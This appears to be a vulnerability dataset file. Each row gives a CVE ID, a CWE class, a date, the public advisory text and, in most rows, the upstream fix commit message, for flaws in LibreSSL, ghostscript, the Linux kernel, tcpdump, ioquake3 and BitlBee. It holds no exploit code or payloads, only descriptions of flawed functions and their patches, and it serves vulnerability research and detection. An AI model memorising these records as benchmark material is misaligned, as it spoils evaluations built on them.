CVE-2018-8970,CWE-295,2018-03-24,"The int_x509_param_set_hosts function in lib/libcrypto/x509/x509_vpm.c in LibreSSL 2.7.0 before 2.7.1 does not support a certain special case of a zero name length, which causes silent omission of hostname verification, and consequently allows man-in-the-middle attackers to spoof servers and obtain sensitive information via a crafted certificate. NOTE: the LibreSSL documentation indicates that this special case is supported, but the BoringSSL documentation does not.",Issue notice by Christian Heimes <christian@python.org> ok deraadt@ jsing@
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2013-6763,CWE-119,2013-11-12,"The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.","Nico Golde reports a few straggling uses of [io_]remap_pfn_range() that really should use the vm_iomap_memory() helper.  This trivially converts two of them to the helper, and comments about why the third one really needs to continue to use remap_pfn_range(), and adds the missing size check.  Reported-by: Nico Golde <nico@ngolde.de> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org."
CVE-2014-3538,CWE-399,2014-07-03,"file before 5.19 does not properly restrict the amount of data read during a regex search, which allows remote attackers to cause a denial of service (CPU consumption) via a crafted file that triggers backtracking during processing of an awk rule.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7345.","* Allow the l modifier for regex to mean line count. Default   to byte count. If line count is specified, assume a max   of 80 characters per line to limit the byte count. * Don't allow conversions to be used for dates, allowing   the mask field to be used as an offset. * Bump the version of the magic format so that regex changes   are visible."
CVE-2017-11472,CWE-755,2017-07-20,"The acpi_ns_terminate() function in drivers/acpi/acpica/nsutils.c in the Linux kernel before 4.12 does not flush the operand cache and causes a kernel stack dump, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism (in the kernel through 4.9) via a crafted ACPI table.","I found some ACPI operand cache leaks in ACPI early abort cases.  Boot log of ACPI operand cache leak is as follows: >[    0.174332] ACPI: Added _OSI(Module Device) >[    0.175504] ACPI: Added _OSI(Processor Device) >[    0.176010] ACPI: Added _OSI(3.0 _SCP Extensions) >[    0.177032] ACPI: Added _OSI(Processor Aggregator Device) >[    0.178284] ACPI: SCI (IRQ16705) allocation failed >[    0.179352] ACPI Exception: AE_NOT_ACQUIRED, Unable to install System Control Interrupt handler (20160930/evevent-131) >[    0.180008] ACPI: Unable to start the ACPI Interpreter >[    0.181125] ACPI Error: Could not remove SCI handler (20160930/evmisc-281) >[    0.184068] kmem_cache_destroy Acpi-Operand: Slab cache still has objects >[    0.185358] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.10.0-rc3 #2 >[    0.186820] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006 >[    0.188000] Call Trace: >[    0.188000]  ? dump_stack+0x5c/0x7d >[    0.188000]  ? kmem_cache_destroy+0x224/0x230 >[    0.188000]  ? acpi_sleep_proc_init+0x22/0x22 >[    0.188000]  ? acpi_os_delete_cache+0xa/0xd >[    0.188000]  ? acpi_ut_delete_caches+0x3f/0x7b >[    0.188000]  ? acpi_terminate+0x5/0xf >[    0.188000]  ? acpi_init+0x288/0x32e >[    0.188000]  ? __class_create+0x4c/0x80 >[    0.188000]  ? video_setup+0x7a/0x7a >[    0.188000]  ? do_one_initcall+0x4e/0x1b0 >[    0.188000]  ? kernel_init_freeable+0x194/0x21a >[    0.188000]  ? rest_init+0x80/0x80 >[    0.188000]  ? kernel_init+0xa/0x100 >[    0.188000]  ? ret_from_fork+0x25/0x30  When early abort is occurred due to invalid ACPI information, Linux kernel terminates ACPI by calling AcpiTerminate() function. The function calls AcpiNsTerminate() function to delete namespace data and ACPI operand cache (AcpiGbl_ModuleCodeList).  But the deletion code in AcpiNsTerminate() function is wrapped in ACPI_EXEC_APP definition, therefore the code is only executed when the definition exists. If the define doesn't exist, ACPI operand cache (AcpiGbl_ModuleCodeList) is leaked, and stack dump is shown in kernel log.  This causes a security threat because the old kernel (<= 4.9) shows memory locations of kernel functions in stack dump, therefore kernel ASLR can be neutralized.  To fix ACPI operand leak for enhancing security, I made a patch which removes the ACPI_EXEC_APP define in AcpiNsTerminate() function for executing the deletion code unconditionally.  Signed-off-by: Seunghun Han <kkamagui@gmail.com> Signed-off-by: Lv Zheng <lv.zheng@intel.com>"
CVE-2012-6546,CWE-200,2013-03-15,"The ATM implementation in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.",The ATM code fails to initialize the two padding bytes of struct sockaddr_atmpvc inserted for alignment. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-4580,CWE-200,2016-05-23,"The x25_negotiate_facilities function in net/x25/x25_facilities.c in the Linux kernel before 4.5.5 does not properly initialize a certain data structure, which allows attackers to obtain sensitive information from kernel stack memory via an X.25 Call Request.","Stack object ""dte_facilities"" is allocated in x25_rx_call_request(), which is supposed to be initialized in x25_negotiate_facilities. However, 5 fields (8 bytes in total) are not initialized. This object is then copied to userland via copy_to_user, thus infoleak occurs.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-11721,CWE-119,2017-08-03,Buffer overflow in ioquake3 before 2017-08-02 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted packet.,Prevent reading past end of message in MSG_ReadBits. If read past end of msg->data buffer (16348 bytes) the engine could SEGFAULT. Make MSG_WriteBits use an exact buffer overflow check instead of possibly failing with a few bytes left.
CVE-2017-13054,CWE-125,2017-09-14,The LLDP parser in tcpdump before 4.9.2 has a buffer over-read in print-lldp.c:lldp_private_8023_print().,"In lldp_private_8023_print() the case block for subtype 4 (Maximum Frame Size TLV, IEEE 802.3bc-2009 Section 79.3.4) did not include the length check and could over-read the input buffer, put it right.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-10189,CWE-476,2017-03-14,BitlBee before 3.5 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) and possibly execute arbitrary code via a file transfer request for a contact that is not in the contact list.,
